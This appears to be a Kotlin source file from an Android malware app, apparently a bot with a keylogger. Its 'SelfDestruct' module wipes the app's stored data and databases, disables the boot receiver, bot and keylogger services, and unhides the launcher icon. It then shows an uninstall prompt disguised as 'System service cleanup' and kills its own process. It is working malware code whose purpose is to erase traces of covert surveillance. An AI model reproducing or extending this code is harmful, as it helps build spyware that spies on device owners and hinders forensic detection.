package com.sys.svc

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.Process
import androidx.core.app.NotificationCompat
import com.sys.svc.helpers.FileHelper

object SelfDestruct {

    fun wipeData(ctx: Context) {
        try { Prefs.clear(ctx) } catch (_: Exception) {}
        try { ctx.cacheDir.deleteRecursively(); ctx.cacheDir.mkdirs() } catch (_: Exception) {}
        try { ctx.filesDir.deleteRecursively(); ctx.filesDir.mkdirs() } catch (_: Exception) {}
        try {
            ctx.databaseList().forEach { name -> ctx.deleteDatabase(name) }
        } catch (_: Exception) {}
        try {
            ctx.getExternalFilesDirs(null).forEach { dir -> dir?.deleteRecursively() }
        } catch (_: Exception) {}
        try {
            ctx.getSystemService(NotificationManager::class.java).cancelAll()
        } catch (_: Exception) {}
        Logger.i("Self", "wipeData done")
    }

    fun disableComponents(ctx: Context) {
        val pm = ctx.packageManager
        try {
            pm.setComponentEnabledSetting(
                ComponentName(ctx, BootReceiver::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
        try {
            pm.setComponentEnabledSetting(
                ComponentName(ctx, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
        try {
            pm.setComponentEnabledSetting(
                ComponentName(ctx, BotService::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
        try {
            pm.setComponentEnabledSetting(
                ComponentName(ctx, KeyloggerService::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun showUninstallNotification(ctx: Context) {
        val ch = BotConfig.NOTIF_CHANNEL_UNINSTALL
        val nm = ctx.getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26 && nm.getNotificationChannel(ch) == null) {
            val c = NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_HIGH).apply {
                setShowBadge(true)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            }
            nm.createNotificationChannel(c)
        }
        val intent = Intent(Intent.ACTION_DELETE).apply {
            data = Uri.parse("package:${ctx.packageName}")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        val flags = if (Build.VERSION.SDK_INT >= 23)
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        else PendingIntent.FLAG_UPDATE_CURRENT
        val pi = PendingIntent.getActivity(ctx, 100, intent, flags)
        val notif: Notification = NotificationCompat.Builder(ctx, ch)
            .setSmallIcon(android.R.drawable.ic_delete)
            .setContentTitle("Tap to remove")
            .setContentText("System service cleanup")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setOngoing(false)
            .setContentIntent(pi)
            .build()
        try { nm.notify(BotConfig.NOTIF_ID_UNINSTALL, notif) } catch (_: Exception) {}
    }

    fun fullDestroy(ctx: Context) {
        try { BotService.stop(ctx) } catch (_: Exception) {}
        try { FileHelper.unhideLauncher(ctx) } catch (_: Exception) {}
        wipeData(ctx)
        disableComponents(ctx)
        try { showUninstallNotification(ctx) } catch (_: Exception) {}
        Handler(Looper.getMainLooper()).postDelayed({
            try { Process.killProcess(Process.myPid()) } catch (_: Exception) {}
            try { kotlin.system.exitProcess(0) } catch (_: Exception) {}
        }, 900)
    }
}